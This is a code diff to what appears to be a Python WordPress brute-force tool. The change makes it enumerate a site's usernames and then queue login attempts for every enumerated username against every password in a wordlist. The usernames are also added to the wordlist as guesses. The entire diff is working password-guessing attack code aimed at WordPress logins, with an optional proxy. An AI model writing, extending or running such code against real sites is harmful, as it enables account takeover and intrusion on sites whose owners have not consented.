@@ -95,15 +95,15 @@ if __name__ == '__main__':
 
     # check URL and username
     logger.info("Checking URL & username...")
+    usernames = [config.username]
     try:
         if wp.check_username(config.username) is False:
             logger.warning("Possible non existent username: %s", config.username)
             logger.info("Enumerating users...")
-            enumerated_usernames = wp.enumerate_usernames(config.eu_gap_tolerance)
-            if len(enumerated_usernames) > 0:
-                logger.info("Usernames: %s", ", ".join(enumerated_usernames))
-                config.username = enumerated_usernames[0]
-            if config.username is False:
+            usernames = wp.enumerate_usernames(config.eu_gap_tolerance)
+            if len(usernames) > 0:
+                logger.info("Usernames: %s", ", ".join(usernames))
+            else:
                 logger.error("Can't find username :(")
                 sys.exit(0)
     except urllib2.HTTPError:
@@ -149,12 +149,14 @@ if __name__ == '__main__':
         [wordlist.append(w.strip()) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with)]
 
     # load logins into task queue
-    logger.info("%s passwords will be tested", str(len(wordlist)))
-    for password in wordlist:
-        login_task = wptask.WpTaskLogin(config.wp_base_url, config.script_path, config.proxy)
-        login_task.setUsername(config.username)
-        login_task.setPassword(password)
-        task_queue.put(login_task)
+    logger.info("%s passwords will be tested", str(len(wordlist)*len(usernames)))
+    [wordlist.append(u) for u in usernames]
+    for username in usernames:
+        for password in wordlist:
+            login_task = wptask.WpTaskLogin(config.wp_base_url, config.script_path, config.proxy)
+            login_task.setUsername(username)
+            login_task.setPassword(password)
+            task_queue.put(login_task)
     del wordlist
 
     # start workers
